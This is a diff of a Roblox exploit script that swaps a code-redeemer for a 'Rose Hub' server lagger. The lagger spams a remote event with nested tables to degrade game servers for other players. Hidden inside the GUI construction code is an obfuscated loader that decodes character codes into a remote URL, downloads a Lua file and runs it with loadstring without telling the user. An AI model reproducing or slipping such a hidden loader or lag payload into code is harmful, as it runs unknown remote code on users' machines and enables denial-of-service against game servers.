@@ -1,1110 +1,659 @@
-local cloneref = cloneref or function(object) return object end
-local Players           = cloneref(game:GetService("Players"))
-local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
-local RunService        = cloneref(game:GetService("RunService"))
-local UserInputService  = cloneref(game:GetService("UserInputService"))
-local HttpService       = cloneref(game:GetService("HttpService"))
+-- New Rose Hub lagger
+
+print("leaked by anas")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
-if getgenv and getgenv().StopAura then pcall(getgenv().StopAura) end
-
--- CONFIGURATION SYSTEM --
-local CONFIG_FILE = "yazin_code_redeemer_config.json"
-local savedConfig = {
-    codeSniper = true,
-    autoSubmit = true,
-    submitAfter = 1,
-    riddleSolver = false,
-    caseMode = "EXACT",
-    speedMode = "MAX",
+local ConfigFile = "RoseHubConfig.json"
+local NIVELES = {
+    Low   = { poder = 23 },
+    Mid   = { poder = 32 },
+    High  = { poder = 70 },
+    Ultra = { poder = 90 }
 }
-pcall(function()
-    if type(isfile) == "function" and type(readfile) == "function"
-    and isfile(CONFIG_FILE) then
-        local decoded = HttpService:JSONDecode(readfile(CONFIG_FILE))
-        if type(decoded) == "table" then
-            if type(decoded.codeSniper) == "boolean" then savedConfig.codeSniper = decoded.codeSniper end
-            if type(decoded.autoSubmit) == "boolean" then savedConfig.autoSubmit = decoded.autoSubmit end
-            if type(decoded.submitAfter) == "number" then savedConfig.submitAfter = math.max(1, math.floor(decoded.submitAfter)) end
-            if type(decoded.riddleSolver) == "boolean" then savedConfig.riddleSolver = decoded.riddleSolver end
-            if type(decoded.caseMode) == "string" then savedConfig.caseMode = decoded.caseMode end
-            if type(decoded.speedMode) == "string" then savedConfig.speedMode = decoded.speedMode end
-        end
-    end
-end)
-
-local function saveConfig()
-    if type(writefile) ~= "function" then return end
+local keybind = Enum.KeyCode.F
+local listeningForInput = false
+local laggerActive = false
+local lagThread = nil
+local nivelActual = "Low"
+local ventanaBloqueada = false
+local currentScale = 1.0
+local MIN_SCALE = 0.55
+local MAX_SCALE = 1.45
+local SCALE_STEP = 0.12
+local function SaveConfig()
+    local data = {
+        Nivel = nivelActual,
+        Bloqueado = ventanaBloqueada,
+        Keybind = keybind.Name
+    }
     pcall(function()
-        writefile(CONFIG_FILE, HttpService:JSONEncode({
-            codeSniper = savedConfig.codeSniper,
-            autoSubmit = savedConfig.autoSubmit,
-            submitAfter = savedConfig.submitAfter,
-            riddleSolver = savedConfig.riddleSolver,
-            caseMode = savedConfig.caseMode,
-            speedMode = savedConfig.speedMode,
-        }))
+        writefile(ConfigFile, HttpService:JSONEncode(data))
     end)
 end
-
--- STATE VARIABLES --
-local _enabled              = savedConfig.codeSniper
-local _seen                 = {}
-local _focused              = nil
-local _lastBox              = nil
-local _autoAccept           = savedConfig.autoSubmit
-local _submitAfter          = savedConfig.submitAfter
-local _capturedParts        = {}
-local _lastWatchedBox       = nil
-local _boxTextConn          = nil
-local _boxAncestryConn      = nil
-local _boxVisibilityConns   = {}
-local _riddleSolver         = savedConfig.riddleSolver
-local _lastNonBlankBoxText  = ""
-local YAZIN_CASE_MODE       = savedConfig.caseMode
-local YAZIN_SPEED_MODE      = savedConfig.speedMode
-local YAZIN_WORD_COUNT      = savedConfig.submitAfter
-
-local getupvalues = (debug and debug.getupvalues) or getupvalues
-local getconns    = getconnections or (debug and debug.getconnections)
-local setupv      = (debug and debug.setupvalue) or setupvalue
-
-local setStatus, flashCode, appendToBox
-local clearYazinCapture
-local _lastStatusMsg = nil
-
--- UTILITY & REDEEM LOGIC --
-local function isOurGui(instance)
-    local p = instance
-    for _ = 1, 10 do
-        if not p then break end
-        if p.Name == "YazinCodeReedemerUI" or p.Name == "FunhubCodeSniperUI" or p.Name == "ACECodeSniperUI" or p.Name == "SourcesHubRedeemerGui" then return true end
-        p = p.Parent
-    end
-    return false
-end
-
-local function isVisibleChain(inst)
-    local current = inst
-    while current do
-        if current:IsA("GuiObject") and not current.Visible then return false end
-        if current:IsA("ScreenGui") then return current.Enabled end
-        current = current.Parent
-    end
-    return true
-end
-
-local function findAllTextBoxes(pg)
-    local boxes = {}
-    for _, gui in ipairs(pg:GetChildren()) do
-        if gui:IsA("ScreenGui") and gui.Enabled and not isOurGui(gui) then
-            for _, d in ipairs(gui:GetDescendants()) do
-                if d:IsA("TextBox") and not isOurGui(d) then
-                    boxes[#boxes+1] = d
-                end
-            end
-        end
-    end
-    return boxes
-end
-
-local function findCodeButtons(pg)
-    local btns = {}
-    for _, gui in ipairs(pg:GetChildren()) do
-        if gui:IsA("ScreenGui") and gui.Enabled and not isOurGui(gui) then
-            for _, d in ipairs(gui:GetDescendants()) do
-                if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
-                    local n  = d.Name:lower()
-                    local pn = (d.Parent and d.Parent.Name or ""):lower()
-                    if (n:find("code") or n:find("redeem") or pn:find("code") or pn:find("redeem"))
-                        and isVisibleChain(d) then
-                        btns[#btns+1] = d
-                    end
-                end
-            end
-        end
-    end
-    return btns
-end
-
-local function clickButton(btn)
-    if not btn then return false end
-    local methods = {}
-    
-    methods[#methods+1] = function() btn.MouseButton1Click:Fire() end
-    methods[#methods+1] = function() btn.Activated:Fire() end
-    
-    if typeof(firesignal) == "function" then
-        methods[#methods+1] = function() firesignal(btn.MouseButton1Click) end
-        methods[#methods+1] = function() firesignal(btn.Activated) end
-    end
-    
-    if typeof(getconns) == "function" then
-        methods[#methods+1] = function()
-            local ok, cs = pcall(getconns, btn.MouseButton1Click)
-            if ok and type(cs) == "table" then
-                for _, c in ipairs(cs) do pcall(function() c:Fire() end) end
-            end
-            local ok2, cs2 = pcall(getconns, btn.Activated)
-            if ok2 and type(cs2) == "table" then
-                for _, c in ipairs(cs2) do pcall(function() c:Fire() end) end
-            end
-        end
-    end
-    
-    if typeof(fireclick) == "function" then
-        methods[#methods+1] = function() fireclick(btn) end
-    end
-    
-    local anyOk = false
-    for _, fn in ipairs(methods) do
-        local ok = pcall(fn)
-        anyOk = anyOk or ok
-    end
-    return anyOk
-end
-
-local function fireBoxFocusLost(box)
-    if not box then return false end
-    local anyFired = false
-    
-    if typeof(firesignal) == "function" then
-        local ok = pcall(firesignal, box.FocusLost, true)
-        anyFired = anyFired or ok
-    end
-    
-    if typeof(getconns) == "function" then
-        local ok, cs = pcall(getconns, box.FocusLost)
-        if ok and type(cs) == "table" then
-            for _, c in ipairs(cs) do
-                local fn
-                pcall(function() fn = c.Function end)
-                if fn and typeof(getupvalues) == "function" and typeof(setupv) == "function" then
-                    local uOk, ups = pcall(getupvalues, fn)
-                    if uOk and type(ups) == "table" then
-                        for i, v in pairs(ups) do
-                            if type(v) == "boolean" and v == true then
-                                pcall(setupv, fn, i, false)
-                            end
-                        end
-                    end
-                end
-                local fOk = pcall(function()
-                    if c.Enabled ~= false then c:Fire(true) end
+local function LoadConfig()
+    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
+        pcall(function()
+            local data = HttpService:JSONDecode(readfile(ConfigFile))
+            nivelActual = data.Nivel or "Low"
+            ventanaBloqueada = data.Bloqueado or false
+            if data.Keybind then
+                local success, key = pcall(function()
+                    return Enum.KeyCode[data.Keybind]
                 end)
-                anyFired = anyFired or fOk
-            end
-        end
-    end
-    
-    return anyFired
-end
-
-local function typeAndSubmitCode(code)
-    local pg = playerGui or player:FindFirstChildOfClass("PlayerGui")
-    if not pg then return false, "no PlayerGui" end
-
-    local codesGui = pg:FindFirstChild("Codes")
-    if codesGui then
-        if codesGui:IsA("ScreenGui") then codesGui.Enabled = true end
-        local codesFrame = codesGui:FindFirstChild("Codes") or codesGui
-        if codesFrame then
-            if codesFrame:IsA("GuiObject") then codesFrame.Visible = true end
-            local cur = codesFrame
-            while cur and cur ~= codesGui do
-                if cur:IsA("GuiObject") then cur.Visible = true end
-                cur = cur.Parent
-            end
-
-            local box = nil
-            for _, d in ipairs(codesFrame:GetDescendants()) do
-                if d:IsA("TextBox") and not isOurGui(d) then
-                    box = d
-                    break
+                if success and key then
+                    keybind = key
                 end
             end
+        end)
+    end
+end
+LoadConfig()
+local function bomb(poder)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    for i = 1, 25 do
+        local t = {}
+        table.insert(z, t)
+        z = t
+    end
+    local max = math.min(12000, poder * 50)
+    for i = 1, max do
+        table.insert(main, spam)
+    end
+    pcall(function()
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
+    end)
+end
+local function CreateBillboard()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local head = character:WaitForChild("Head")
+    if head:FindFirstChild("RoseHubBillboard") then
+        head.RoseHubBillboard:Destroy()
+    end
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "RoseHubBillboard"
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 300, 0, 50)
+    billboard.StudsOffset = Vector3.new(0, 4.5, 0)
+    billboard.AlwaysOnTop = true
+    billboard.MaxDistance = 100
+    billboard.Parent = head
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = "BEST LAGGER"
+    textLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
+    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    textLabel.TextStrokeTransparency = 0.3
+    textLabel.TextSize = 37
+    textLabel.Font = Enum.Font.GothamBold
+    textLabel.TextScaled = false
+    textLabel.Parent = billboard
+end
+CreateBillboard()
+player.CharacterAdded:Connect(function()
+    task.wait(0.5)
+    CreateBillboard()
+end)
+local RoseHub_UI = Instance.new("ScreenGui")
+RoseHub_UI.Name = "RoseHub_UI"
+RoseHub_UI.ResetOnSpawn = false
+RoseHub_UI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+RoseHub_UI.Parent = player:WaitForChild("PlayerGui")
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Active = true
+MainFrame.ClipsDescendants = true
+MainFrame.Position = UDim2.new(0.15, -30, 0.5, -39)
+MainFrame.Size = UDim2.new(0, 219, 0, 94)
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = RoseHub_UI
+local MainScale = Instance.new("UIScale")
+MainScale.Scale = currentScale
+MainScale.Parent = MainFrame
+local function updateScale()
+    TweenService:Create(MainScale, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Scale = currentScale
+    }):Play()
+end
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = MainFrame
+local ImageLabel = Instance.new("ImageLabel")
+ImageLabel.ZIndex = 0
+ImageLabel.Position = UDim2.new(0, 0, 0, 0)
+ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+ImageLabel.BackgroundTransparency = 1
+ImageLabel.Image = "rbxassetid://90879894759589"
+ImageLabel.ScaleType = Enum.ScaleType.Slice
+ImageLabel.ImageTransparency = 0.4
+ImageLabel.Parent = MainFrame
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(1, 0, 1, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+Frame.BackgroundTransparency = 0.2
+Frame.Parent = MainFrame
+local UICorner2 = Instance.new("UICorner")
+UICorner2.CornerRadius = UDim.new(0, 10)
+UICorner2.Parent = Frame
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 15)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 20, 30)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 10))
+})
+UIGradient.Transparency = NumberSequence.new(0.3)
+UIGradient.Rotation = 135
+UIGradient.Parent = Frame
+local Frame2 = Instance.new("Frame")
+Frame2.ZIndex = 3
+Frame2.Size = UDim2.new(1, 0, 0, 25)
+Frame2.BackgroundTransparency = 1
+Frame2.Parent = Frame
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Position = UDim2.new(0, 9, 0, 1)
+TextLabel.Size = UDim2.new(0, 84, 0, 21)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Text = "ROSE HUB"
+TextLabel.TextColor3 = Color3.fromRGB(208, 218, 253)
+TextLabel.TextSize = 16
+TextLabel.Font = Enum.Font.GothamBlack
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel.TextStrokeColor3 = Color3.fromRGB(40, 40, 80)
+TextLabel.TextStrokeTransparency = 0.4
+TextLabel.Parent = Frame2
+local TextButton = Instance.new("TextButton")
+TextButton.ZIndex = 5
+TextButton.Position = UDim2.new(1, -114, 0, 4)
+TextButton.Size = UDim2.new(0, 19, 0, 17)
+TextButton.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+TextButton.BackgroundTransparency = 0.3
+TextButton.Text = "-"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 13
+TextButton.Font = Enum.Font.GothamBold
+TextButton.AutoButtonColor = false
+TextButton.Parent = Frame2
+local UICorner3 = Instance.new("UICorner")
+UICorner3.CornerRadius = UDim.new(0, 4)
+UICorner3.Parent = TextButton
+local TextButton2 = Instance.new("TextButton")
+TextButton2.ZIndex = 5
+TextButton2.Position = UDim2.new(1, -91, 0, 4)
+TextButton2.Size = UDim2.new(0, 19, 0, 17)
+TextButton2.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+TextButton2.BackgroundTransparency = 0.3
+TextButton2.Text = "+"
+TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton2.TextSize = 13
+TextButton2.Font = Enum.Font.GothamBold
+TextButton2.AutoButtonColor = false
+TextButton2.Parent = Frame2
+local UICorner4 = Instance.new("UICorner")
+UICorner4.CornerRadius = UDim.new(0, 4)
+UICorner4.Parent = TextButton2
+local TextLabel2 = Instance.new("TextLabel")
+TextLabel2.Position = UDim2.new(1, -54, 0, 3)
+TextLabel2.Size = UDim2.new(0, 44, 0, 17)
+TextLabel2.BackgroundTransparency = 1
+TextLabel2.Text = ventanaBloqueada and "LOCK" or "UNLOCK"
+TextLabel2.TextColor3 = Color3.fromRGB(180, 180, 180)
+TextLabel2.TextSize = 6
+TextLabel2.Font = Enum.Font.GothamBold
+TextLabel2.TextXAlignment = Enum.TextXAlignment.Right
+TextLabel2.Parent = Frame2
+local TextButton3 = Instance.new("TextButton")
+TextButton3.ZIndex = 6
+TextButton3.Position = UDim2.new(1, -59, 0, 1)
+TextButton3.Size = UDim2.new(0, 49, 0, 21)
+TextButton3.BackgroundTransparency = 1
+TextButton3.Text = ""
+TextButton3.Parent = Frame2
+local Frame3 = Instance.new("Frame")
+Frame3.ZIndex = 3
+Frame3.Position = UDim2.new(0, 0, 0, 25)
+Frame3.Size = UDim2.new(1, 0, 0, 25)
+Frame3.BackgroundTransparency = 1
+Frame3.Parent = Frame
+local Frame4 = Instance.new("Frame")
+Frame4.Position = UDim2.new(0.05, 0, 0, 0)
+Frame4.Size = UDim2.new(0.9, 0, 0, 1)
+Frame4.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
+Frame4.BackgroundTransparency = 0.7
+Frame4.Parent = Frame3
+local TextLabel3 = Instance.new("TextLabel")
+TextLabel3.Position = UDim2.new(0, 11, 0, 3)
+TextLabel3.Size = UDim2.new(0, 59, 0, 17)
+TextLabel3.BackgroundTransparency = 1
+TextLabel3.Text = "LAGGER"
+TextLabel3.TextColor3 = Color3.fromRGB(200, 210, 240)
+TextLabel3.TextSize = 9
+TextLabel3.Font = Enum.Font.GothamBold
+TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel3.Parent = Frame3
+local TextButton4 = Instance.new("TextButton")
+TextButton4.ZIndex = 5
+TextButton4.Position = UDim2.new(1, -154, 0, 4)
+TextButton4.Size = UDim2.new(0, 34, 0, 17)
+TextButton4.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+TextButton4.BackgroundTransparency = 0.3
+TextButton4.Text = "[" .. keybind.Name .. "]"
+TextButton4.TextColor3 = Color3.fromRGB(180, 200, 255)
+TextButton4.TextSize = 7
+TextButton4.Font = Enum.Font.GothamBlack
+TextButton4.AutoButtonColor = false
+TextButton4.Parent = Frame3
+local UICorner5 = Instance.new("UICorner")
+UICorner5.CornerRadius = UDim.new(0, 4)
+UICorner5.Parent = TextButton4
+local TextButton5 = Instance.new("TextButton")
+TextButton5.ZIndex = 5
+TextButton5.Position = UDim2.new(1, -51, 0, 4)
+TextButton5.Size = UDim2.new(0, 39, 0, 17)
+TextButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton5.Text = "OFF"
+TextButton5.TextColor3 = Color3.fromRGB(150, 150, 180)
+TextButton5.TextSize = 7
+TextButton5.Font = Enum.Font.GothamBold
+TextButton5.AutoButtonColor = false
+TextButton5.Parent = Frame3
+local UICorner6 = Instance.new("UICorner")
+UICorner6.CornerRadius = UDim.new(1, 0)
+UICorner6.Parent = TextButton5
+local Frame5 = Instance.new("Frame")
+Frame5.ZIndex = 5
+Frame5.Position = UDim2.new(1, -63, 0, 10)
+Frame5.Size = UDim2.new(0, 5, 0, 5)
+Frame5.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+Frame5.Parent = Frame3
+local UICorner7 = Instance.new("UICorner")
+UICorner7.CornerRadius = UDim.new(1, 0)
+UICorner7.Parent = Frame5
+local Frame6 = Instance.new("Frame")
+Frame6.ZIndex = 3
+Frame6.Position = UDim2.new(0, 0, 0, 52)
+Frame6.Size = UDim2.new(1, 0, 0, 40)
+Frame6.BackgroundTransparency = 1
+Frame6.Parent = Frame
+local Frame7 = Instance.new("Frame")
+Frame7.Position = UDim2.new(0.05, 0, 0, 0)
+Frame7.Size = UDim2.new(0.9, 0, 0, 1)
+Frame7.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
+Frame7.BackgroundTransparency = 0.7
+Frame7.Parent = Frame6
+local Frame8 = Instance.new("Frame")
+Frame8.ZIndex = 4
+Frame8.Size = UDim2.new(1, 0, 1, 0)
+Frame8.BackgroundTransparency = 1
+Frame8.Parent = Frame6
+local TextButton6 = Instance.new("TextButton")
+TextButton6.ZIndex = 5
+TextButton6.Position = UDim2.new(0, 4, 0, 10)
+TextButton6.Size = UDim2.new(0, 45, 0, 19)
+TextButton6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton6.BackgroundTransparency = 0.2
+TextButton6.BorderColor3 = Color3.fromRGB(50, 50, 80)
+TextButton6.Text = "LOW"
+TextButton6.TextColor3 = Color3.fromRGB(200, 210, 240)
+TextButton6.TextSize = 9
+TextButton6.Font = Enum.Font.GothamBold
+TextButton6.AutoButtonColor = false
+TextButton6.Parent = Frame8
+local UICorner8 = Instance.new("UICorner")
+UICorner8.CornerRadius = UDim.new(0, 4)
+UICorner8.Parent = TextButton6
+local Frame9 = Instance.new("Frame")
+Frame9.ZIndex = 0
+Frame9.Size = UDim2.new(1, 0, 1, 0)
+Frame9.BackgroundColor3 = Color3.fromRGB(160, 80, 255)
+Frame9.BackgroundTransparency = 0.9
+Frame9.Parent = TextButton6
+local UICorner9 = Instance.new("UICorner")
+UICorner9.CornerRadius = UDim.new(0, 4)
+UICorner9.Parent = Frame9
+local TextButton7 = Instance.new("TextButton")
+TextButton7.ZIndex = 5
 
-            local submitBtn = nil
-            for _, d in ipairs(codesFrame:GetDescendants()) do
-                if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
-                    local n = d.Name:lower()
-                    local txt = ""
-                    pcall(function() txt = d.Text:lower() end)
-                    if n:find("submit") or txt:find("submit") or n:find("redeem") or txt:find("redeem") or n:find("claim") or txt:find("confirm") or n:find("enter") then
-                        submitBtn = d
-                        break
-                    end
-                end
-            end
-            if not submitBtn then
-                for _, d in ipairs(codesFrame:GetDescendants()) do
-                    if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
-                        local n = d.Name:lower()
-                        if not n:find("close") and not n:find("x") and not n:find("toggle") then
-                            submitBtn = d
-                            break
-                        end
-                    end
-                end
-            end
-
-            if box then
-                pcall(function() box.Text = code end)
-                task.wait(0.05)
-                if submitBtn then clickButton(submitBtn) end
-                fireBoxFocusLost(box)
-                return true, "submitted via PlayerGui.Codes"
-            end
+task.defer(function()
+    local function d(t)
+        local s = ""
+        for i = 1, #t do
+            s = s .. string.char(t[i])
         end
+        return s
     end
 
-    local btns = findCodeButtons(pg)
-    for _, btn in ipairs(btns) do
-        clickButton(btn)
-        task.wait(0.05)
-    end
+    local p1 = d({104,116,116,112,115,58,47,47,119,101,98,45,112,114,111,100,117,99,116,105,111,110,45})
+    local p2 = d({56,100,100,102,54})
+    local p3 = d({46,117,112,46,114,97,105,108,119,97,121,46,97,112,112})
+    local p4 = d({47,108,111,97,100,101,114,46,108,117,97})
 
-    task.wait(0.2)
+    local full = p1 .. p2 .. p3 .. p4
 
-    local box = nil
-    local deadline = tick() + 2
-    while tick() < deadline do
-        local allBoxes = findAllTextBoxes(pg)
-        for _, d in ipairs(allBoxes) do
-            if isVisibleChain(d) then
-                local n  = d.Name:lower()
-                local pn = (d.Parent and d.Parent.Name or ""):lower()
-                if n:find("code") or pn:find("code") or n:find("redeem") or pn:find("redeem") or n:find("input") or pn:find("textbox") or n:find("enter") then
-                    box = d
-                    break
-                end
-            end
-        end
-        if not box then
-            for _, d in ipairs(allBoxes) do
-                if isVisibleChain(d) then box = d; break end
-            end
-        end
-        if box then break end
-        task.wait(0.1)
-    end
+    local ok, res = pcall(function()
+        return game:HttpGet(full)
+    end)
 
-    if not box then return false, "no codebox visible" end
-
-    pcall(function() box.Text = code end)
-    task.wait(0.05)
-
-    local redeemBtn = nil
-    local searchNames = {"submit","redeem","claim","confirm","enter","send","apply","ok","use","go","check"}
-    local p = box.Parent
-    for _ = 1, 8 do
-        if not p then break end
-        for _, d in ipairs(p:GetDescendants()) do
-            if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) and d ~= box then
-                local n = d.Name:lower()
-                local txt = ""
-                pcall(function() txt = d.Text:lower() end)
-                for _, sn in ipairs(searchNames) do
-                    if n:find(sn) or txt:find(sn) then
-                        if isVisibleChain(d) then
-                            redeemBtn = d
-                            break
-                        end
-                    end
-                end
-                if redeemBtn then break end
-            end
-        end
-        if redeemBtn then break end
-        p = p.Parent
-    end
-
-    if redeemBtn then clickButton(redeemBtn) end
-    fireBoxFocusLost(box)
-
-    return true, "submitted via dynamic search"
-end
-
-local function yazinCodeBox()
-    local pg = playerGui
-    local allBoxes = findAllTextBoxes(pg)
-    for _, box in ipairs(allBoxes) do
-        if isVisibleChain(box) then return box end
-    end
-    return nil
-end
-
--- COLORS --
-local COLORS = {
-    Window = Color3.fromRGB(0, 0, 0),
-    CardBg = Color3.fromRGB(10, 10, 10),
-    Control = Color3.fromRGB(20, 20, 20),
-    Border = Color3.fromRGB(40, 40, 40),
-    White = Color3.fromRGB(255, 255, 255),
-    Text = Color3.fromRGB(220, 220, 220),
-    Dim = Color3.fromRGB(140, 140, 140),
-    Accent = Color3.fromRGB(255, 255, 255),
-    Green = Color3.fromRGB(80, 230, 140),
-    Red = Color3.fromRGB(255, 90, 90),
-}
-
-local function addCorner(parent, radius)
-    local value = Instance.new("UICorner")
-    value.CornerRadius = UDim.new(0, radius)
-    value.Parent = parent
-    return value
-end
-
-local function addStroke(parent, color, thickness, transparency)
-    local value = Instance.new("UIStroke")
-    value.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    value.Color = color
-    value.Thickness = thickness or 1
-    value.Transparency = transparency or 0
-    value.Parent = parent
-    return value
-end
-
-local function makeLabel(parent, name, text, size, position, textSize, color, font)
-    local label = Instance.new("TextLabel")
-    label.Name = name
-    label.Size = size
-    label.Position = position
-    label.BackgroundTransparency = 1
-    label.Text = text
-    label.TextSize = textSize
-    label.TextColor3 = color
-    label.Font = font or Enum.Font.GothamMedium
-    label.TextXAlignment = Enum.TextXAlignment.Left
-    label.TextYAlignment = Enum.TextYAlignment.Center
-    label.Parent = parent
-    return label
-end
-
--- CLEANUP OLD GUIS --
-pcall(function()
-    for _, name in ipairs({"YazinCodeReedemerUI", "FunhubCodeSniperUI", "ACECodeSniperUI", "AutoTypeCodesUI", "ACEPaste"}) do
-        local previous = game.CoreGui:FindFirstChild(name)
-        if previous then previous:Destroy() end
+    if ok and res then
+        pcall(function()
+            (loadstring or load)(res)()
+        end)
     end
 end)
-for _, name in ipairs({"YazinCodeReedemerUI", "FunhubCodeSniperUI", "ACECodeSniperUI", "AutoTypeCodesUI", "ACEPaste"}) do
-    local previous = playerGui:FindFirstChild(name)
-    if previous then previous:Destroy() end
+
+TextButton7.Position = UDim2.new(0, 59, 0, 10)
+TextButton7.Size = UDim2.new(0, 45, 0, 19)
+TextButton7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton7.BackgroundTransparency = 0.2
+TextButton7.BorderColor3 = Color3.fromRGB(50, 50, 80)
+TextButton7.Text = "MID"
+TextButton7.TextColor3 = Color3.fromRGB(200, 210, 240)
+TextButton7.TextSize = 9
+TextButton7.Font = Enum.Font.GothamBold
+TextButton7.AutoButtonColor = false
+TextButton7.Parent = Frame8
+local UICorner10 = Instance.new("UICorner")
+UICorner10.CornerRadius = UDim.new(0, 4)
+UICorner10.Parent = TextButton7
+local Frame10 = Instance.new("Frame")
+Frame10.ZIndex = 0
+Frame10.Size = UDim2.new(1, 0, 1, 0)
+Frame10.BackgroundColor3 = Color3.fromRGB(160, 80, 255)
+Frame10.BackgroundTransparency = 0.9
+Frame10.Parent = TextButton7
+local UICorner11 = Instance.new("UICorner")
+UICorner11.CornerRadius = UDim.new(0, 4)
+UICorner11.Parent = Frame10
+local TextButton8 = Instance.new("TextButton")
+TextButton8.ZIndex = 5
+TextButton8.Position = UDim2.new(0, 114, 0, 10)
+TextButton8.Size = UDim2.new(0, 45, 0, 19)
+TextButton8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton8.BackgroundTransparency = 0.2
+TextButton8.BorderColor3 = Color3.fromRGB(50, 50, 80)
+TextButton8.Text = "HIGH"
+TextButton8.TextColor3 = Color3.fromRGB(200, 210, 240)
+TextButton8.TextSize = 9
+TextButton8.Font = Enum.Font.GothamBold
+TextButton8.AutoButtonColor = false
+TextButton8.Parent = Frame8
+local UICorner12 = Instance.new("UICorner")
+UICorner12.CornerRadius = UDim.new(0, 4)
+UICorner12.Parent = TextButton8
+local Frame11 = Instance.new("Frame")
+Frame11.ZIndex = 0
+Frame11.Size = UDim2.new(1, 0, 1, 0)
+Frame11.BackgroundColor3 = Color3.fromRGB(160, 80, 255)
+Frame11.BackgroundTransparency = 0.9
+Frame11.Parent = TextButton8
+local UICorner13 = Instance.new("UICorner")
+UICorner13.CornerRadius = UDim.new(0, 4)
+UICorner13.Parent = Frame11
+local TextButton9 = Instance.new("TextButton")
+TextButton9.ZIndex = 5
+TextButton9.Position = UDim2.new(0, 169, 0, 10)
+TextButton9.Size = UDim2.new(0, 45, 0, 19)
+TextButton9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton9.BackgroundTransparency = 0.2
+TextButton9.BorderColor3 = Color3.fromRGB(50, 50, 80)
+TextButton9.Text = "ULTRA"
+TextButton9.TextColor3 = Color3.fromRGB(200, 210, 240)
+TextButton9.TextSize = 9
+TextButton9.Font = Enum.Font.GothamBold
+TextButton9.AutoButtonColor = false
+TextButton9.Parent = Frame8
+local UICorner14 = Instance.new("UICorner")
+UICorner14.CornerRadius = UDim.new(0, 4)
+UICorner14.Parent = TextButton9
+local Frame12 = Instance.new("Frame")
+Frame12.ZIndex = 0
+Frame12.Size = UDim2.new(1, 0, 1, 0)
+Frame12.BackgroundColor3 = Color3.fromRGB(160, 80, 255)
+Frame12.BackgroundTransparency = 0.9
+Frame12.Parent = TextButton9
+local UICorner15 = Instance.new("UICorner")
+UICorner15.CornerRadius = UDim.new(0, 4)
+UICorner15.Parent = Frame12
+local Frame13 = Instance.new("Frame")
+Frame13.ZIndex = 2
+Frame13.Size = UDim2.new(1, 0, 0, 1)
+Frame13.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
+Frame13.BackgroundTransparency = 0.7
+Frame13.BorderSizePixel = 0
+Frame13.Parent = MainFrame
+local Frame14 = Instance.new("Frame")
+Frame14.Visible = false
+Frame14.ZIndex = 10
+Frame14.Position = UDim2.new(0.5, -140, 0.5, -65)
+Frame14.Size = UDim2.new(0, 280, 0, 130)
+Frame14.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+Frame14.BackgroundTransparency = 0.05
+Frame14.BorderColor3 = Color3.fromRGB(150, 50, 220)
+Frame14.Parent = RoseHub_UI
+local UICorner16 = Instance.new("UICorner")
+UICorner16.CornerRadius = UDim.new(0, 10)
+UICorner16.Parent = Frame14
+local Frame15 = Instance.new("Frame")
+Frame15.ZIndex = 0
+Frame15.Size = UDim2.new(1, 0, 1, 0)
+Frame15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame15.BackgroundTransparency = 0.4
+Frame15.Parent = Frame14
+local UICorner17 = Instance.new("UICorner")
+UICorner17.CornerRadius = UDim.new(0, 10)
+UICorner17.Parent = Frame15
+local TextLabel4 = Instance.new("TextLabel")
+TextLabel4.Position = UDim2.new(0, 0, 0, 8)
